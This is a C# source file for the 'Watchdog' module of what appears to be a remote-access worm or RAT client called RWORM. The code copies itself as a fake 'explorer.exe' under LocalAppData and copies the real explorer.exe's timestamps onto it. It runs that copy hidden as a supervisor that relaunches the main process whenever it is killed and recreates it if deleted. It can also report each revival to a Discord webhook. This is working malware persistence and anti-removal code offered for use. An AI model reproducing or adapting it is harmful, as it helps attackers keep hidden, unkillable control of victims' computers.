using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    
    
    
    
    
    
    
    public static class Watchdog
    {
        private static Process? _supervisorProcess;
        private static volatile bool _isShuttingDown = false;
        private static volatile bool _watchdogDisabled = false;

        private static readonly string FlagPath = Path.Combine(Path.GetTempPath(), "rworm_clean_exit.flag");
        private static readonly string MutexName = "Global\\RWORM_Supervisor_" + (Config.GetGuid().Substring(0, 8));

        public static bool IsActive => !_watchdogDisabled && _supervisorProcess != null && !_supervisorProcess.HasExited;

        public static void InitializeWatchdog()
        {
            if (!Config.AntiKill || _watchdogDisabled) return;

            try
            {
                var currentExe = Environment.ProcessPath;
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe))
                {
                    currentExe = Process.GetCurrentProcess().MainModule?.FileName;
                }
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe)) return;

                
                try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }

                
                string supervisorDir;
                try
                {
                    supervisorDir = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                        "Microsoft", "Windows", "Explorer");
                    Directory.CreateDirectory(supervisorDir);
                }
                catch
                {
                    supervisorDir = Path.Combine(Path.GetTempPath(), "Explorer");
                    Directory.CreateDirectory(supervisorDir);
                }

                var supervisorExe = Path.Combine(supervisorDir, "explorer.exe");

                
                ExtractOrUpdateSupervisor(currentExe, supervisorExe);

                StartSupervisorInstance(currentExe, supervisorExe);
            }
            catch { }
        }

        private static void ExtractOrUpdateSupervisor(string currentExe, string supervisorExe)
        {
            try
            {
                bool extracted = false;
                var asm = Assembly.GetExecutingAssembly();

                
                foreach (var resName in asm.GetManifestResourceNames())
                {
                    if (resName.EndsWith("explorer.exe", StringComparison.OrdinalIgnoreCase))
                    {
                        using var resStream = asm.GetManifestResourceStream(resName);
                        if (resStream != null)
                        {
                            using var fs = new FileStream(supervisorExe, FileMode.Create, FileAccess.Write, FileShare.Read);
                            resStream.CopyTo(fs);
                            extracted = true;
                            break;
                        }
                    }
                }

                
                if (!extracted)
                {
                    if (!File.Exists(supervisorExe) || new FileInfo(supervisorExe).Length != new FileInfo(currentExe).Length)
                    {
                        File.Copy(currentExe, supervisorExe, true);
                    }
                }

                
                var sysExplorer = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
                if (File.Exists(sysExplorer))
                {
                    File.SetCreationTime(supervisorExe, File.GetCreationTime(sysExplorer));
                    File.SetLastWriteTime(supervisorExe, File.GetLastWriteTime(sysExplorer));
                    File.SetLastAccessTime(supervisorExe, File.GetLastAccessTime(sysExplorer));
                }
            }
            catch { }
        }

        private static void StartSupervisorInstance(string currentExe, string supervisorExe)
        {
            if (_isShuttingDown || _watchdogDisabled) return;

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName        = supervisorExe,
                    Arguments       = $"--supervisor \"{currentExe}\" {Environment.ProcessId}",
                    UseShellExecute = false,
                    CreateNoWindow  = true,
                    WindowStyle     = ProcessWindowStyle.Hidden
                };

                _supervisorProcess = Process.Start(psi);
                if (_supervisorProcess != null)
                {
                    _supervisorProcess.EnableRaisingEvents = true;
                    _supervisorProcess.Exited += (s, e) =>
                    {
                        if (!_isShuttingDown && !_watchdogDisabled)
                        {
                            Thread.Sleep(1200);
                            StartSupervisorInstance(currentExe, supervisorExe);
                        }
                    };
                }
            }
            catch { }
        }

        public static void StopWatchdog()
        {
            _watchdogDisabled = true;
            _isShuttingDown = true;

            try
            {
                File.WriteAllText(FlagPath, "clean_exit");
            }
            catch { }

            try
            {
                if (_supervisorProcess != null && !_supervisorProcess.HasExited)
                {
                    _supervisorProcess.Kill();
                }
            }
            catch { }
            _supervisorProcess = null;

            
            try
            {
                var supervisorDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft", "Windows", "Explorer");
                var supervisorExe = Path.Combine(supervisorDir, "explorer.exe");

                foreach (var p in Process.GetProcessesByName("explorer"))
                {
                    try
                    {
                        var fn = p.MainModule?.FileName;
                        if (!string.IsNullOrEmpty(fn) &&
                            string.Equals(fn, supervisorExe, StringComparison.OrdinalIgnoreCase))
                        {
                            p.Kill();
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        public static void StartWatchdog()
        {
            _watchdogDisabled = false;
            _isShuttingDown = false;
            Config.AntiKill = true;
            try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }
            InitializeWatchdog();
        }

        public static void PrepareCleanExit()
        {
            StopWatchdog();
        }

        
        
        
        
        
        public static void RunWatchdogMode(string[] args)
        {
            if (args.Length < 3) return;

            string targetExe = args[1];
            if (!int.TryParse(args[2], out int targetPid)) return;

            
            using var mutex = new Mutex(true, MutexName, out bool createdNew);
            if (!createdNew) return;

            MonitorLoop(targetExe, targetPid);
        }

        private static void MonitorLoop(string targetExe, int targetPid)
        {
            int failureCount = 0;
            DateTime lastReviveTime = DateTime.MinValue;

            while (true)
            {
                try
                {
                    var parentProc = Process.GetProcessById(targetPid);
                    parentProc.WaitForExit();
                }
                catch
                {
                    
                }

                
                if (File.Exists(FlagPath))
                {
                    try { File.Delete(FlagPath); } catch { }
                    return; 
                }

                
                var now = DateTime.UtcNow;
                if ((now - lastReviveTime).TotalSeconds < 3)
                {
                    failureCount++;
                    if (failureCount > 10)
                    {
                        Thread.Sleep(10000); 
                        failureCount = 0;
                    }
                }
                else
                {
                    failureCount = 0;
                }
                lastReviveTime = now;

                
                try
                {
                    if (!File.Exists(targetExe))
                    {
                        var selfExe = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName;
                        if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
                        {
                            var targetDir = Path.GetDirectoryName(targetExe);
                            if (!string.IsNullOrEmpty(targetDir)) Directory.CreateDirectory(targetDir);
                            File.Copy(selfExe, targetExe, true);
                        }
                    }

                    if (Config.DiscordAlert && !string.IsNullOrWhiteSpace(Config.DiscordWebhook))
                    {
                        _ = DiscordNotifier.SendReviveAlertAsync(Config.DiscordWebhook, targetExe);
                    }

                    var psi = new ProcessStartInfo
                    {
                        FileName        = targetExe,
                        UseShellExecute = true,
                        CreateNoWindow  = true,
                        WindowStyle     = ProcessWindowStyle.Hidden
                    };

                    var newProc = Process.Start(psi);
                    if (newProc != null)
                    {
                        targetPid = newProc.Id;
                        Thread.Sleep(2000);
                        continue;
                    }
                }
                catch { }

                Thread.Sleep(2500);
            }
        }
    }
}
